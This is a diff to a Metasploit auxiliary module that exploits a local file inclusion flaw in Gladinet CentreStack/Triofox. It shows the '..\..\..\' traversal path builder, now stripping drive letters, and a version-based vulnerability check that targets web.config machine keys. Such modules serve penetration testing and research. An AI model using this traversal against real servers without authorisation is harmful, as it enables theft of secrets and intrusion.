@@ -57,7 +57,9 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def build_lfi_path(file_path)
-    "..\\..\\..\\#{file_path.gsub(' ', '+')}"
+    # Remove C:\ prefix if present (LFI doesn't work with drive letters)
+    normalized_path = file_path.gsub(/^[A-Z]:\\/, '').gsub(/^[A-Z]:/, '')
+    "..\\..\\..\\#{normalized_path.gsub(' ', '+')}"
   end
 
   def send_lfi_request(file_path)
@@ -74,17 +76,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx')
-    })
-    return Exploit::CheckCode::Unknown unless valid_response?(res)
-    return Exploit::CheckCode::Safe('Target does not appear to be Gladinet CentreStack/Triofox') unless valid_response?(res) && gladinet?(res)
+    version = gladinet_version
+    return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?
 
-    lfi_res = send_lfi_request(DEFAULT_WEB_CONFIG_PATH)
-    return Exploit::CheckCode::Vulnerable('LFI vulnerability confirmed') if valid_response?(lfi_res) && contains_machinekey?(lfi_res.body)
+    rex_version = Rex::Version.new(version)
+    lfi_vulnerable = rex_version <= Rex::Version.new('16.10.10408.56683')
+    return Exploit::CheckCode::Vulnerable("LFI vulnerability confirmed (Build #{version})") if lfi_vulnerable
 
-    Exploit::CheckCode::Appears('Gladinet detected but LFI not confirmed')
+    Exploit::CheckCode::Detected("Version #{version} detected, attempting LFI anyway")
   end
 
   def read_file_via_lfi(file_path)
